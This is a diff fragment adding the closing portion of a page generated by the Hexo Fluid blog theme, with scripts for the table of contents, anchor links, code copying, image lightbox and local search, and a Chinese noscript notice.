+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
